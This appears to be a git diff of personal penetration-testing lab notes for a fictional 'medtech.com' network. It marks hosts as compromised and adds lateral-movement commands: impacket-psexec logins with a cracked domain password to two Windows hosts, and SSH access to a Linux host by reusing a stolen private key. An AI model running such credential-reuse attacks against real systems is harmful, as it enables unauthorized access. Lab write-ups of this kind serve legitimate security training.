@@ -1,4 +1,4 @@
-# VM 1
+# VM 1 (pwned)
 - dc01.medtech.com
 ```
 PORT      STATE SERVICE       VERSION
@@ -43,6 +43,10 @@ Host script results:
 |_clock-skew: -9s
 
 ```
+## Foothold & Root
+    ```
+        impacket-psexec medtech.com/leon:rabbit:\)@172.16.244.10
+    ```
 
 # VM 2 (pwned)
 - files02.medtech.com
@@ -156,7 +160,7 @@ Host script results:
          Cracked = rabbit:)
     ```
 
-# VM 7
+# VM 7 (pwned)
 - prod01.medtech.com
 ```
 PORT      STATE SERVICE       VERSION
@@ -176,8 +180,12 @@ PORT      STATE SERVICE       VERSION
 49669/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 ```
+## Foothold & Root
+    ```
+        impacket-psexec medtech.com/leon:rabbit:\)@172.16.244.13
+    ```
 
-# VM 8
+# VM 8 (pwned)
 - ?
 ```
     22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
@@ -185,6 +193,12 @@ PORT      STATE SERVICE       VERSION
     |   3072 eb:0e:77:7c:69:f2:4a:a5:65:2a:1c:ec:ec:6e:79:19 (RSA)
     |_  256 74:51:ee:1e:8f:61:d6:0f:c5:11:52:2e:f9:ef:ac:29 (ECDSA)
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+## Foothold
+- Sharing same id_rsa with VM5 (sometimes can try reusing those private ssh key)
+```
+    chmod 600 od_rsa
+    ssh mario@172.16.244.14 -i id_rsa
 ```
 
 # VM 9 (pwned)
